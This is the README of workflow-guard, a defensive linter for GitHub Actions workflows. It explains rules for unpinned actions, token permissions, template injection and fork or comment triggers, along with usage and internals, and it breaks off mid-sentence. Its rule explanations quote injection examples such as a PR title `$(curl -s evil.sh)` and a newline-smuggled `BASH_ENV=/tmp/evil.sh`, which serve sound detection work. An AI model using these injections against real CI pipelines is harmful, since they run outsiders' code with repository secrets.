# workflow-guard

A small command-line checker for **security mistakes in GitHub Actions workflows**: actions that
aren't pinned, a `GITHUB_TOKEN` with more rights than it needs, pull request titles pasted into
shell scripts, and a few more. It prints `file:line:column` findings and exits non-zero, so it can
run in CI or as a pre-commit check.

## Why

Workflows are code that runs with secrets and a token that can write to the repository, but they
rarely get reviewed like code. The mistakes are well documented (GitHub's own
[security hardening guide](https://docs.github.com/en/actions/security-for-github-actions/security-guides/security-hardening-for-github-actions),
the [WordPress workflow standards](https://developer.wordpress.org/coding-standards/wordpress-coding-standards/github-actions/))
and easy to check by machine.

This is a learning project. Mature tools already exist and go much further:
[actionlint](https://github.com/rhysd/actionlint) type-checks whole workflows and
[zizmor](https://github.com/zizmorcore/zizmor) is a full security auditor. workflow-guard is
deliberately small and readable: one file per concern, every rule explained below.

## Rules

| Id | Name | Severity | What it finds |
|----|------|----------|---------------|
| WG001 | unpinned-action | low for `actions/*`, `github/*`; high for other owners; medium for Docker tags | `uses:` with a tag or branch (`@v4`, `@main`), a short SHA, or no version. A tag can be moved to malicious code after you've reviewed it; a full 40-character commit SHA can't. Covers steps and reusable workflows (`jobs.<id>.uses`). |
| WG002 | missing-permissions | medium | No `permissions:` at the top and at least one job without its own. The token then gets the repository's default, which may be read/write for everything. |
| WG003 | write-all | high | `permissions: write-all` at workflow or job level. |
| WG004 | template-injection | high | `${{ github.event.pull_request.title }}` and other outsider-controlled values (issue/PR/comment text, branch names, commit messages) inside `run:`, `actions/github-script` or the script input of an action that runs one (see [Actions that run a script](#actions-that-run-a-script)). The value is pasted into the script before it runs, so a PR titled `$(curl -s evil.sh)` downloads and runs that script. Pass it through `env:` and use `"$TITLE"` instead. In a composite action or a reusable workflow (`on: workflow_call`), `${{ inputs.* }}` in `run:` is reported too (medium): the calling workflow may pass untrusted text. When the caller (a job or a step) is one of the checked files, what it really passes in `with:` decides instead (high for a PR title, nothing for clean values; see below). Detours are followed too: `env:`, `$GITHUB_ENV`, `$GITHUB_OUTPUT` and job outputs (see below). |
| WG005 | pull-request-target | low, or high with a PR checkout | `pull_request_target` runs with secrets even for pull requests from forks. Checking out the PR's head (`ref: ${{ github.event.pull_request.head.sha }}`, or a `refs/pull/...` ref) then runs a stranger's code with those secrets. A step whose `if:` (or its job's, or a needed job's) is false for a fork's pull request isn't reported: `github.event.pull_request.head.repo.full_name == github.repository`, `!github.event.pull_request.head.repo.fork`, an allow-list of `github.event.pull_request.author_association`, `github.event_name == 'push'` in a workflow with more triggers (see How it works). The reminder goes when every job keeps forks out. |
| WG006 | persisted-credentials | low | `actions/checkout` without `persist-credentials: false` leaves the token in `.git/config`, readable by every later step. |
| WG007 | untrusted-github-env | high (medium for inputs from unknown callers) | Untrusted text appended to `$GITHUB_ENV` or `$GITHUB_PATH` in `run:`, directly or through `env:`/shell variables (`echo "T=$TITLE" >> "$GITHUB_ENV"`). Every later step reads those files: a PR title with a line break such as `x` + newline + `BASH_ENV=/tmp/evil.sh` sets a variable that makes bash run the sender's script, and `$GITHUB_PATH` can put their directory first in `PATH`. No `${{ }}` in the script is needed for this, so WG004 alone doesn't catch it. Pass the value to the step that needs it via `env:` or a step output. |
| WG008 | secrets-exposure | medium; high for `toJSON(secrets)` | `${{ secrets.X }}` pasted into `run:` or a github-script: the secret becomes part of the script text, quotes or `$` in it break the script, and `set -x`, an error message or a process listing can show it (GitHub's log masking only catches exact matches). Pass it through `env:` and use `"$X"`. Also `toJSON(secrets)` anywhere (every secret in one value) and `secrets: inherit` on a reusable workflow from another repository (all secrets handed to code that lives elsewhere). Passing a secret to an action's `with:` is fine. |
| WG009 | workflow-run | high for a checkout of the triggering commit or artifacts unpacked into the workspace before a `run:` step; medium for other artifact downloads | A `workflow_run` workflow runs with secrets and a write token, but the run that triggered it may have built a fork's pull request. Checking out `github.event.workflow_run.head_sha` (or `head_branch`, `head_repository`, `pull_requests`) runs the fork's code with those secrets; so does doing it in a script (`git checkout`, `git fetch`, `git switch`, `git reset`, `git pull`, `git worktree add` of the head, also through an `env:` variable, or `gh pr checkout` of its pull request). Its artifacts (`actions/download-artifact` with `run-id:`, `dawidd6/action-download-artifact`, `gh run download`, `downloadArtifact` in a github-script) are the fork author's files: unpacked into the workspace they can replace the repository's scripts and config that later steps run. Download to `${{ runner.temp }}` and treat the contents as data. A step whose `if:` (or its job's, or a needed job's) is false for a fork's run isn't reported: `github.event.workflow_run.head_repository.full_name == github.repository`, `github.event.workflow_run.event == 'push'`, `head_repository.fork == false`. When every workflow named under `on.workflow_run.workflows` is among the checked files and none runs on `pull_request` (or another `workflow_run`), nothing is reported: those runs only build this repository's own commits. A `branches:` filter under `on.workflow_run` doesn't change that and is named in the message: it matches the head branch of the fork's pull request, whose name the fork picks (`main` too). |
| WG010 | comment-command | high for a checkout of the pull request; medium for a job with secrets | `issue_comment` runs with secrets and a write token, and anyone who can comment (on a public repository: anyone) starts it. A `/test` or `/deploy` job that checks out the pull request (`ref: refs/pull/${{ github.event.issue.number }}/head`, a ref from a step or job output, `gh pr checkout`, `git fetch origin pull/N/head`) or uses secrets other than `GITHUB_TOKEN` must check who commented. Counted as a check: a job `if:` (or a step's, for that step) on `github.event.comment.author_association`, `github.actor` / `github.triggering_actor` or the commenter's login that is false for everyone who can't write (an allow-list such as `== 'OWNER'`, `contains(fromJSON('["OWNER","MEMBER"]'), ...)` or `contains(fromJSON(vars.MAINTAINERS), github.actor)`); a deny-list such as `author_association != 'NONE'` or `github.actor != 'renovate[bot]'` is not, and the message names who still gets in; a step that asks for the commenter's permission (`getCollaboratorPermissionLevel`, `gh api .../collaborators/<user>/permission`, `actions-cool/check-user-permission`, `xt0rted/slash-command-action`, `peter-evans/slash-command-dispatch` and similar) *and fails on a no*: `core.setFailed`, `throw` or `process.exit(1)` in a github-script, `exit 1` or a `\| grep -q` that isn't the condition of an `if`/`&&`/`\|\|` in a script, `actions-cool/check-user-permission` only with `error-if-missing: true`, `sushichop/action-repository-permission` not with `relax: true`, and not with `continue-on-error: true`, covers the steps after it (a checkout or secret before it is reported, and the message names the late check); if its own `if:` may be false for a stranger, it covers only the steps whose `if:` has the same condition (the same parts joined by `&&`), and a job that needs it only if the job's `if:` has that condition read through the job's outputs (`needs.<job>.outputs.<name>` carrying exactly `${{ steps.<id>.outputs.<x> }}`); a step that only reports the answer covers the steps whose `if:` reads it (`steps.<id>.outputs...`, `steps.<id>.outcome`) and the jobs whose `if:` reads it through a job output (`needs.<job>.outputs.<name>`), if that `if:` is false for every answer someone who can't write gets: nothing (a misspelt or unset output), `false`, `none` or `read`. So `== 'true'` counts but `!= 'false'` and a bare `steps.perm.outputs.ok` (the text `false` is true in an `if:`) don't, and the message names the answers that still get through; a bash script that looks at who commented and writes its answer to `$GITHUB_OUTPUT` (`echo "trusted=false" >> "$GITHUB_OUTPUT"`) is such a step too, with the outputs it really writes for a stranger; or such a check in a job it `needs:` (anywhere in that job: when it fails, this job doesn't run). A check that stops the job or a needed job holds only for what doesn't run after a failure: a later step or a dependent job whose `if:` calls `always()`, `failure()` or `cancelled()` (`${{ !cancelled() }}` too) still runs for a stranger, unless the rest of its `if:` stops them (`always() && needs.gate.result == 'success'`), and the message names the function. The message names a weak `if:` in a needed job, and a permission step whose answer nothing waits for. Matching the comment's text (`startsWith(github.event.comment.body, '/test')`) is not a check, and the message says so. Also counted: a step that fails whenever it runs (`exit 1`, `core.setFailed`) with an `if:` that is true for every no a reporting step before it gives (`if: steps.perm.outputs.require-result != 'true'` then `run: exit 1`), and an `if:` that is never true for a comment (`github.event_name == 'push'`; in a run started by a comment `github.event_name` is `issue_comment`). Also a bash `run:` script that looks at who commented (through `${{ }}` or an `env:` variable it uses) and exits non-zero for every commenter who can't write, in a step that always runs (`case "$ASSOC" in OWNER|MEMBER|COLLABORATOR) ;; *) exit 1 ;; esac`); one that lets some through (a deny-list, an extra rule for pull request authors) is named in the message. A script only counts as a checkout when a git command (`fetch`, `checkout`...) or `gh pr checkout` is on the line with the pull request's ref: `echo "REF=refs/pull/..." >> $GITHUB_ENV` checks nothing out. |

### Actions that run a script

Some actions take a script as an input and run it: on the runner, in a container, or on a server
over SSH. `${{ }}` there is pasted into the code just like in `run:`, so WG004 and WG008 check
these inputs too (names without case, any version), and the message names the action:

| Action | Inputs |
|--------|--------|
| `actions/github-script` | `script` |
| `appleboy/ssh-action` | `script` |
| `garygrossgarten/github-action-ssh`, `google-github-actions/ssh-compute` | `command` |
| `addnab/docker-run-action` | `run` |
| `uraimo/run-on-arch-action` | `run`, `install`, `setup` |
| `nick-fields/retry` (and its old name `nick-invision/retry`) | `command`, `on_retry_command`, `new_command_on_retry` |
| `Wandalen/wretry.action` | `command` |
| `azure/cli`, `azure/powershell` | `inlineScript` |
| `cypress-io/github-action` | `build`, `start`, `command`, `install-command` |
| `mathiasvr/command-output` | `run` |
| `jannekem/run-python-script-action` | `script` |

For SSH and container actions the step's `env:` doesn't reach the script by itself; the message
says how to pass a variable there (`envs:` for `appleboy/ssh-action`, `options: -e NAME` for
`addnab/docker-run-action`, ...). The list lives in `src/workflow_guard/scripts.py`.

**Your own actions.** An in-house action that runs an input as a script isn't on the list.
Name it with `--script-input owner/repo:input` (several inputs separated by commas, the option
repeated for more actions; a path inside the repository works too, `my-org/actions/deploy:run`),
or with the action's `script-inputs` input:

```yaml
- uses: Gallileee/workflow-guard@<sha>  # vX.Y.Z
  with:
    script-inputs: |
      my-org/deploy:commands
      my-org/actions/notify:message,on_failure
```

Those inputs are then checked like `run:` by WG004 and WG008; for a listed action the inputs
are added to its own.

### Actions too

Besides workflows, workflow-guard reads **action metadata files** (`action.yml`), recognised by
their `runs:` key:

- Composite actions (`using: composite`): the steps under `runs.steps` get WG001, WG004 and
  WG006, like a job's steps. WG002/WG003 don't apply (an action has no `permissions:`; it runs
  with the caller's token) and neither does WG005 (no triggers).
- Docker actions: `runs.image: docker://name:tag` is WG001 (medium), like a Docker `uses:`.
  `image: Dockerfile` is built from the action's own repository and is fine.
- JavaScript actions (`using: node24`) have nothing to check in their metadata.

Without arguments it checks `.github/workflows/`, an `action.yml` at the repository root (a
repository that *is* an action) and local actions in `.github/actions/<name>/action.yml`.
`--fix` pins the steps of composite actions as well.

## Use it in your repository

### As a GitHub Action

```yaml
# .github/workflows/workflow-guard.yml
name: workflow-guard
on:
  pull_request:
    paths: [".github/workflows/**"]
  push:
    branches: [main]
permissions:
  contents: read
jobs:
  check:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1  # v7.0.1
        with:
          persist-credentials: false
      - uses: Gallileee/workflow-guard@v0.4.0   # better: pin the commit SHA, see below
```

Findings show up as annotations on the workflow lines of the pull request (`::error` for high,
`::warning` for medium, `::notice` for low) and the step fails. No extra permissions are needed,
and it works in private repositories too.

Pin the action to a commit like any other: `workflow-guard --fix` turns `@v0.4.0` into
`@<sha>  # v0.4.0` for you.

| Input | Default | Meaning |
|-------|---------|---------|
| `paths` | `""` (`.github/workflows`) | files or directories, separated by spaces or new lines |
| `format` | `github` | `github` (annotations), `text`, `json` or `sarif` |
| `output` | `""` | write the report to this file instead of the log |
| `fail-on` | `""` (the settings file's, else `low`) | fail the step on findings at this level or above |
| `min-severity` | `""` (the settings file's, else `low`) | hide findings below this level |
| `config` | `""` (`.github/workflow-guard.yml` if there is one) | settings file; `none` reads none (see [Settings file](#settings-file)) |
| `ignore` | `""` | comma-separated rule ids, e.g. `WG006`; added to the settings file's |
| `script-inputs` | `""` | your own actions that run an input as a script: `owner/repo:input[,input]`, separated by spaces or new lines (see [Actions that run a script](#actions-that-run-a-script)) |
| `python-version` | `3.12` | Python that runs the tool; the job's own Python isn't changed |

How the action is built (`action.yml`, a composite action):

- `actions/setup-python` with `update-environment: false`, so the tool's Python stays off the
  job's `PATH` and can't break the caller's own Python setup.
- The action installs its own checkout (the exact commit you pinned) into a virtual environment
  in `$RUNNER_TEMP`, not a package from PyPI that could change under the same version.
- Inputs reach the shell through `env:`, never as `${{ inputs.x }}` inside `run:` (that would be
  the template injection WG004 reports), and the paths come after `--`, so a path can't turn
  into an option such as `--fix`.
- CI runs it on Ubuntu and Windows (the `action` job), against this repository and a deliberately
  unsafe fixture.

### Settings file

Instead of repeating options in the workflow, the pre-commit configuration and your shell, put
them in `.github/workflow-guard.yml` (or `.yaml`):

```yaml
ignore: [WG006]                 # rule ids, a list or "WG006, WG002"
min-severity: low               # low, medium, high
fail-on: medium
script-inputs:                  # your own actions that run an input as a script
  - my-org/deploy:commands
```

All three ways of running workflow-guard read it: the command line and the pre-commit hook look
in the current folder and the folders above it, up to the repository root, and the action runs
in the checked-out repository. Options given directly win (`--fail-on high` over `fail-on:`);
`ignore` and `script-inputs` from both are combined. `--config FILE` (the action's `config`
input) names another file, `--no-config` (`config: none`) reads none. An unknown key, rule id or
level stops the run with an error (exit 2), so a typo can't silently switch a setting off. The
file isn't a workflow and isn't checked as one.

### As a pre-commit hook

```yaml
# .pre-commit-config.yaml
repos:
  - repo: https://github.com/Gallileee/workflow-guard
    rev: v0.4.0
    hooks:
      - id: workflow-guard
```

[pre-commit](https://pre-commit.com) installs the tool in its own environment and runs it on the
workflow and action files a commit changes (`.github/workflows/*.yml`, `action.yml` and
`.github/actions/**/action.yml`, also as `.yaml`).

## Install

Needs Python 3.10+.

```bash
git clone https://github.com/Gallileee/workflow-guard.git
cd workflow-guard
python -m venv .venv
.venv/bin/pip install -e ".[dev]"      # Windows: .venv\Scripts\pip install -e ".[dev]"
```

## Usage

```bash
workflow-guard                          # checks .github/workflows and action.yml files here
workflow-guard path/to/ci.yml other/dir # files or directories
workflow-guard --format json            # machine-readable output
workflow-guard --format github          # annotations, inside a GitHub Actions step
workflow-guard --format sarif --output results.sarif  # for GitHub code scanning
workflow-guard --min-severity medium    # hide low findings
workflow-guard --fail-on high           # show everything, but only fail on high
workflow-guard --ignore WG006           # skip rules
workflow-guard --script-input my-org/deploy:commands  # an action of yours that runs an input
workflow-guard --config ci/wg.yml       # another settings file (--no-config: none)
workflow-guard --list-rules
workflow-guard --fix                    # pin actions to commit SHAs (rewrites the files)
```

Example (from a real repository):

```
.github/workflows/server.yml:8:1: WG002 [medium] no 'permissions:' at the top or in job(s) test; ...
.github/workflows/server.yml:12:15: WG001 [low] 'actions/checkout@v7' points to a tag or branch that can be moved; ...
```

To accept a finding on one line, add a comment there:

```yaml
- uses: actions/checkout@v4  # workflow-guard: ignore[WG001, WG006]
```

### Pinning actions automatically

`--fix` looks up the commit each tag or branch points to right now and rewrites the line:

```diff
-      - uses: actions/checkout@v7
+      - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1  # v7
```

- Only the `uses:` value and the end of its line change. Comments, quotes, indentation and
  Windows line endings stay as they were; an existing comment becomes `# v7; old comment`.
- The new comment follows the file's style, so a formatter check doesn't fail afterwards.
  Prettier writes one space before `#` (`@<sha> # v7`), yamllint wants two (`@<sha>  # v7`).
  In this order:
  1. `--comment-spaces N`, if given;
  2. the gap the file's own end-of-line comments use most (a tie goes to two spaces);
  3. one space if the repository uses Prettier (a `.prettierrc*` / `prettier.config.*` file,
     or `prettier` in `package.json`), found by walking up to the folder with `.git`;
  4. two spaces.
- The version stays in the comment, so Dependabot and Renovate can keep updating pinned actions.
- It uses `GET /repos/{owner}/{repo}/commits/{ref}` with the `application/vnd.github.sha` media
  type, which answers with just the SHA. Lookups are cached per run.
- GitHub allows 60 anonymous API requests an hour. Set `GITHUB_TOKEN` or `GH_TOKEN` for more, e.g.
  `GH_TOKEN=$(gh auth token) workflow-guard --fix`. The token is only sent to api.github.com.
- Lines with `# workflow-guard: ignore[WG001]`, local actions, actions without a version and
  Docker images are left alone. A tag that can't be found is reported and its line kept.
- Review the diff before committing: `--fix` trusts what the tag points to today, so it pins
  whatever is there now. Check that the action is one you meant to use.

### Code scanning (SARIF)

`--format sarif` writes [SARIF 2.1.0](https://docs.oasis-open.org/sarif/sarif/v2.1.0/sarif-v2.1.0.html),
which GitHub code scanning reads. The findings then appear in the repository's Security tab and as
annotations on the lines a pull request changes. Use `--output FILE` rather than `>`: PowerShell's
redirection writes UTF-16, which the upload rejects.

```yaml
jobs:
  workflow-guard:
    runs-on: ubuntu-latest
    permissions:
      contents: read
      security-events: write   # needed to upload results
    steps:
      - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1  # v7.0.1
        with:
          persist-credentials: false
      - uses: Gallileee/workflow-guard@v0.4.0   # pin the commit SHA (workflow-guard --fix)
        with:
          format: sarif
          output: results.sarif
          fail-on: high
      - uses: github/codeql-action/upload-sarif@33d7b85da1a04171e211befe2c739303b9a4c066  # v4.39.3
        if: always()
        with:
          sarif_file: results.sarif
          category: workflow-guard
```

How the report maps to code scanning:

- Severity becomes the SARIF `level`: high = `error`, medium = `warning`, low = `note`. It's set per
  result because WG001 and WG005 vary per finding; that's also why the rules carry no
  `security-severity` score (GitHub reads that per rule, not per result).
- Every rule has a description and help text, shown on the alert page.
- Each result has its own `partialFingerprints` value, a hash of rule, file and message without
  the line number. An alert therefore stays the same alert when lines above it move, and is closed
  when the problem is fixed. Two identical problems in one file are told apart by their order.
- Paths are relative to where you run the tool (`%SRCROOT%`), so run it from the repository root.
- Files that can't be parsed are listed as tool notifications, and the run is marked
  unsuccessful, instead of just missing from the report.

This repository's own CI uploads its results the same way (the `code-scanning` job, which runs
the CLI directly). Code scanning needs a public repository or GitHub Advanced Security; the
default `format: github` annotations work everywhere.

Exit codes: `0` nothing at or above `--fail-on` (default `low`), `1` findings, `2` a file couldn't
be read or parsed, or bad arguments.

## How it works

- Workflows are read with PyYAML's `compose`, which gives **nodes** with line and column numbers
  instead of plain dicts. That's what makes `file:line:column` possible, and it also avoids a
  classic YAML 1.1 trap: `yaml.safe_load` turns the key `on` into the boolean `True`.
- Each rule is a function `Workflow -> Iterator[Finding]` in `rules.py`, registered in `RULES`.
- `${{ }}` expressions are **parsed**, not matched with regular expressions (`expressions.py`):
  a small lexer splits them into tokens, and property accesses become normalized paths, so
  `github.event['pull_request']['title']`, `GITHUB.EVENT.PULL_REQUEST.TITLE` and
  `github.event.pull_request.title` are the same thing (GitHub ignores case), and
  `commits[0].message` matches `commits.*.message`. A quoted string such as
  `'github.head_ref'` is text, not a context, and a `}}` inside it doesn't end the expression.
  `toJSON(github.event)` is reported too: it prints every field, titles and bodies included.
  The paths are then compared with a list of outsider-controlled fields.
- WG010 **evaluates** a job's `if:` (`conditions.py`): a small parser (`!` > comparisons > `&&`
  > `||`) and an evaluator with three-valued logic. The condition is evaluated once for each
  `author_association` of people who can't write (`CONTRIBUTOR`, `FIRST_TIME_CONTRIBUTOR`,
  `FIRST_TIMER`, `MANNEQUIN`, `NONE`), with the commenter's login set to a *stranger* (equal to
  no login in the workflow) and everything else unknown. `x && false` is false whatever `x` is;
  `x && true` is unknown. Only a condition that is certainly false for all five keeps strangers
  out.
- WG005 and WG009 evaluate `if:` for a **fork** (`conditions.FORK_PR`, `FORK_RUN`): the head
  repository's name and owner are a stranger's (never equal to `github.repository`, the base
  repository or `github.repository_owner`), `head.repo.fork` is true, the pull request's author
  and `github.actor` are strangers, `author_association` each association that can't write,
  `github.event.workflow_run.event` is `pull_request` and `github.event_name` the trigger.
  A label check (`contains(github.event.pull_request.labels.*.name, 'safe to test')`) isn't a
  guard: the label stays when the fork pushes new commits. A job that needs a guard job is
  guarded too, unless its `if:` runs it anyway (`always()`, as for WG010). When a guard is there
  but doesn't hold, the message says why (`_fork_note`): an `author_association` deny-list (and
  who it still lets in), a label, only the triggering run's `conclusion`, a check of the head
  repository or author that is still true for a fork, or an `always()` that runs the job (or a
  job it needs) past its guard job.
- WG010 knows that a check with its own `if:` may be **skipped** (`_Stop.sure` in `rules.py`):
  unless that `if:` is true for every stranger, it covers only later steps whose `if:` contains
  every part of it (`a && b` covers `a && b && c`, not `a` or `a || b`). The same goes for a
  job that needs the job with the check: its `if:` must have the check's condition, with each
  `steps.<id>.outputs.<x>` read as the job output that carries exactly that value. Otherwise the
  needed job may succeed for a stranger, and the message says the check may be skipped.
- WG010 sorts permission steps (`_permission_check` in `rules.py`) into ones that **fail** on a
  no, which stop the whole job, and ones that only **report** the answer in an output, which
  protect only the steps and jobs whose `if:` reads that output. The action list records which
  input switches failing on or off (`error-if-missing`, `relax`). A step that fails covers the
  steps after it in its job. An `if:` that reads a reported answer is evaluated like a
  commenter check, once for each answer a commenter who can't write may get (`NO_ANSWERS` in
  `conditions.py`: empty, `false`, `none`, `read`), with `steps.<id>.outcome` set to `success`
  (or `failure` for a step that would fail but has `continue-on-error`). Through a job output
  the output's own expression is evaluated first (`may_pass`, `text_value`). It has to be false
  for all of them: an `if:` that fails closed when the output is missing.
- WG010 knows that a failed step or job stops only what has no **status function** in its `if:`
  (GitHub puts `success() &&` in front of every other `if:`). For a step after one that fails on
  a no, or a job after a needed job that fails (or is skipped) for a stranger, the `if:` is
  evaluated with `success()` false, `failure()` true after a failure (false after a skip when
  nothing else ran before it, otherwise unknown), `cancelled()` unknown (another comment can
  cancel the run through `concurrency:`), `always()` true and `needs.<job>.result` set for
  every needed job that doesn't succeed for a stranger (so `needs.a.result == 'success' ||
  needs.b.result == 'success'` is false when `a` checks and `b` only runs on
  `workflow_dispatch`); a skipped job's outputs are empty.
- WG010 runs a bash `run:` script **on paper** (`shell.py`) when it looks at who commented:
  once for each association that can't write, with the variables set as for an `if:` (the
  association, a stranger's login, `issue_comment` for `github.event_name`) and everything else
  unknown. It follows `if`/`elif`/`else`, `case` (glob patterns), `&&`/`||`/`!`, `[ ]`/`test`/
  `[[ ]]` (`=`, `==`, `!=`, `=~`, `-z`, `-n`, `-a`, `-o`), assignments, `exit` and `set -e`
  (GitHub's bash runs with `-e`, so a failing test alone on a line ends the script, but not in a
  condition, a negated command or the middle of a `&&`/`||` list). A test it can't decide goes
  both ways; the script is a check only if every path exits non-zero. Functions
  (`name() { ...; }`, `function name { ...; }`) run where they're called, with `$1`... from the
  call (empty at the top: GitHub passes no arguments), `local` variables put back afterwards and
  `return`; `{ ...; }` groups run in place; redirections after them are skipped. Inside a
  function or group called in a condition, negated or before the last command of a `&&`/`||`
  list, `-e` doesn't act (bash's rule). Loops: `for x in a b c` runs the body once per word;
  over words it can't count (`$LIST`, `$(...)`, a glob, a value with spaces) and for
  `while`/`until` the body runs round after round from every state the last round left, until
  no new state turns up (at most 8 rounds, else unknown); `break` and `continue` end a round,
  `done < file` is fine. Commands that set variables are followed: `read` (unknown values),
  `export`/`declare`/`readonly NAME=value`, `unset`, `printf -v`, and `NAME=value command`
  prefixes. `eval`, `source`, `shift`, `let`, `getopts`, `((...))`, subshells, arrays, process
  substitution (`< <(...)`), background jobs and heredocs make it unknown (not a check). Only steps whose shell
  is bash or sh (the default, except on a Windows runner) and whose `if:` is true for everyone
  are looked at.
- A bash script that asks the **permission API** about the commenter is run on paper too:
  `P=$(gh api .../collaborators/$USER/permission --jq .permission)` gives a stranger `none` or
  `read`, or the call fails (a 404), which ends the script under `-e` or takes the `else` of
  `if P=$(...)`; `|| echo X` gives `X` (maybe after gh's error text); without `--jq`/`| jq` the
  answer is JSON, equal to no word; `gh api ... | grep -q[EiwxFs] PATTERN` is followed as well.
  The user has to be the commenter (`${{ github.actor }}`, `$GITHUB_ACTOR`, a step `env:` set
  from the comment). Then the step fails on a no only if every path exits; a script that exits
  only when the call fails just reports. Scripts it can't follow (arrays, `eval`, another
  user, another jq filter) are still judged from their text (`core.setFailed`, `throw`,
  `exit 1`, `grep -q`).
- An `actions/github-script` step is run on paper too (`jscript.py`), for a stranger:
  `context.actor` and the commenter's login are a stranger, `author_association` each
  association that can't write, `context.eventName` is `issue_comment`, the rest of `context`
  unknown. `getCollaboratorPermissionLevel` about the stranger answers `permission`/`role_name`
  `none` or `read` (`user.permissions` all false but `pull`) or throws a 404; any other call
  answers something unknown and may throw. It follows `const`/`let` (with `{ a: { b } }`
  patterns), assignments, `if`/`else`, `return`, `throw`, `try`/`catch`/`finally`,
  `core.setFailed`, `core.setOutput`, `process.exit`, `!`, `&&`, `||`, `??`, `? :`, `===`,
  `+`, template strings, `.includes`, `.toLowerCase` and the like, and `${{ }}` pasted into the
  script. The step fails on a no if every path fails; otherwise its outputs are what it really
  writes (`core.setOutput`, and `result` from `return`: JSON unless `result-encoding: string`,
  so `return false` is the text `false`, which is true in an `if:`). A github-script that looks
  at who commented without the API (`if (author_association !== 'OWNER') core.setFailed(...)`)
  is a check the same way. Arrow functions, functions, loops and `switch` make the script
  unknown: then the text decides, as before.
- A step that never runs for a stranger (its `if:` checks who commented, or a permission step's
  answer) writes no outputs, so a job output carrying one of its outputs is empty for them.
- WG010 reads what a bash script **writes to `$GITHUB_OUTPUT`** (`shell.script_outputs`):
  `echo "name=value" >> "$GITHUB_OUTPUT"` (`-n`/`-e` aside), `printf 'name=%s\n' "$x"`,
  `printf '%s\n' "name=$x"`, and `echo` inside `{ ...; } >> "$GITHUB_OUTPUT"`, on every path where
  the script succeeds (an `exit 0` ends a path early). A script that looks at who commented
  (`${{ }}`, its `env:`, `$GITHUB_ACTOR`, the permission API) and writes something is a step
  that only reports: an `if:` on `steps.<id>.outputs.<name>` is evaluated with each set of
  outputs it can write for a stranger (an output it doesn't write is empty). Any other mention
  of `$GITHUB_OUTPUT` (`tee`, a copy in a variable, `name<<EOF`, a redirected `if`) makes the
  outputs unknown, and so does `continue-on-error`. For a script that asks the permission API,
  an output it can't work out falls back to the answers above.
- `a || b` with `a` unknown and `b` truthy is truthy as a condition, but its value is unknown
  (it may be `a`): compared, passed to a function or put into text (`env:`, job outputs) it is
  unknown, not `true`.
- A step that asks for the commenter's permission isn't reported for the secrets it uses
  itself: it needs a token to ask the API. The steps after it are what it guards.
- WG010 knows what some actions answer (`_ACTION_ANSWERS` in `rules.py`, from the action's
  source): `actions-cool/check-user-permission` always sets `user-permission` (`none` or `read`
  for a stranger), and `require-result` (`false`) when `require:` is given. For those outputs
  only these answers are tried, so `require-result != 'false'` and `== 'false'` then `exit 1`
  are checks. Every other output can also be empty, `false`, `none` or `read`.
- WG004 also follows untrusted values on a **detour** (`taint.py`). The steps of each job are
  walked in order, like the runner does, keeping track of which values are *tainted*:
  `env:` at workflow, job and step level (a clean value at a lower level removes the taint),
  `NAME=value >> $GITHUB_ENV` (later steps), `name=value >> $GITHUB_OUTPUT` in a step with an
  `id` (`steps.<id>.outputs.<name>`), and job `outputs:` (`needs.<job>.outputs.<name>`, in any
  job order). A value is tainted if an expression in it is, or, in a script, if it uses a
  shell variable holding a tainted value. The message spells the detour out:

  ```
  'steps.meta.outputs.title' carries 'github.event.pull_request.title', which outsiders can set
  (via env.TITLE (step 'meta') -> steps.meta.outputs.title) and is pasted into a script; ...
  ```

  `"$TITLE"` in the script stays fine: the shell reads the variable, nothing is pasted.
- **Local reusable workflows** (`calls.py`): all files are loaded before any is checked, and
  every job with `uses: ./.github/workflows/<file>.yml` links the caller to that file. The
  caller's `with:` values are read like any other value (direct `${{ }}`, `needs.*.outputs`,
  its own `inputs.*` when it is reusable too), and the called workflow's `inputs.<name>` then
  carries the worst of what its callers pass. The finding's detour shows that caller; every
  other caller that also passes untrusted text is listed at the end of the message
  (`other callers pass untrusted text too: with.title in .github/workflows/issues.yml (job
  'label') ('github.event.issue.title'); ...`), so all of them can be fixed at once. Callers
  passing clean values aren't listed. A chain of reusable workflows is linked caller first. With no caller among the checked files, inputs stay medium, except `type: boolean`
  and `type: number`, which can't carry text; `workflow_dispatch` inputs are trusted (only
  people with write access can start a run):

  ```
  .github/workflows/label.yml:12:14: WG004 [high] 'inputs.title' carries
  'github.event.pull_request.title', which outsiders can set (via with.title in
  .github/workflows/triage.yml (job 'label')) and is pasted into a script; ...
  ```
- **Local actions** are linked the same way: a step with `uses: ./.github/actions/<name>` (or
  `uses: ./` for an `action.yml` at the repository root) is a caller of that folder's
  `action.yml`/`action.yaml`. Its `with:` values are read with what is tainted at that step,
  so `env:` (the step's own too) and earlier step outputs count. Composite actions that run
  other local actions, and reusable workflows that run local actions, chain like above. The
  hop names the caller's line:

  ```
  .github/actions/comment/action.yml:9:12: WG004 [high] 'inputs.body' carries
  'github.event.comment.body', which outsiders can set (via env.BODY (step 1 of job 'reply')
  -> with.body in .github/workflows/reply.yml:7) and is pasted into a script; ...
  ```
- **Outputs come back** too. After a step with an `id` that runs a local action, its
  `steps.<id>.outputs.*` carry what the action's `outputs.<name>.value` carries; after a job
  that calls a local reusable workflow, `needs.<job>.outputs.*` carry what its
  `on.workflow_call.outputs.<name>.value` carries (usually `${{ jobs.<job>.outputs.<x> }}`).
  Each call is worked out with its own `with:` values, so a clean call doesn't inherit the
  title another call passed to the same action. An action that reads the event itself works
  too:

  ```
  .github/workflows/label.yml:9:14: WG004 [high] 'steps.meta.outputs.title' carries
  'github.event.pull_request.title', which outsiders can set (via env.TITLE (step 'meta') ->
  steps.meta.outputs.title -> outputs.title of .github/actions/pr-meta/action.yml ->
  steps.meta.outputs.title) and is pasted into a script; ...
  ```
- The writes themselves are read by `writes.py`: single `>> $GITHUB_*` lines, `{ ... } >>`
  groups (on one line or several), `cat <<EOF >> $GITHUB_*` shell heredocs, and multi-line
  values (`name<<DELIM`, the lines, `DELIM`), also when every line has its own `>>`. In
  `actions/github-script`, `core.setOutput`, `core.exportVariable` and `core.addPath` count
  too, with `context.payload.*` read as `github.event.*` and `process.env.NAME` as the variable.
  For `run: |` blocks the line of the expression itself is reported, not the `run:` line.
- `--format github` prints [workflow commands](https://docs.github.com/en/actions/reference/workflows-and-actions/workflow-commands).
  Messages and properties are percent-encoded the way the runner expects (`%`, `\r`, `\n`, and
